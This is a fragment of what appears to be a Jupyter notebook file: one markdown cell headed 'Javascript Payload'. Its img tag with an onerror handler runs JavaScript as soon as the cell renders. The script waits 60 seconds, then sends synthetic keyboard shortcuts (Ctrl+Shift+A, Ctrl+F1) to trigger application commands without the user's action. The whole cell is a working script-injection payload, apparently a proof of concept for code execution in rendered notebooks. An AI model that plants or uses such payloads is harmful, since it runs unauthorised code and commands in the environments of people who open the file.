   "source": "<img src=\"data:foobar\" onerror='\nconst updateStatus = text => {\n  const status = getRootNode().querySelector(\"#status\");\n  if (status) status.innerText = text;\n}\nconst sleep = ms => new Promise(r => setTimeout(r, ms));\nasync function runPayload() {\n  const sleep_time = 60;\n  updateStatus(\"Sleeping for \" + sleep_time + \"s...\");\n  await sleep(sleep_time * 1000);\n  updateStatus(\"Running.\");\n  if (!window.secondRun) {\n    window.secondRun = true;\n    return;\n  }\n  window.dispatchEvent(\n    new KeyboardEvent(\"keydown\", {key: \"a\", code: \"KeyA\", keyCode: 65, ctrlKey: true, shiftKey: true})\n  );\n  await sleep(500);\n  window.dispatchEvent(\n    new KeyboardEvent(\"keydown\", {key: \"F1\", code: \"F1\", keyCode: 112, ctrlKey: true})\n  );\n}\nrunPayload();\n'>\n\n# Javascript Payload\n\n<b>Status:</b> <span id=\"status\">JS hasn't run yet</span>"
  }
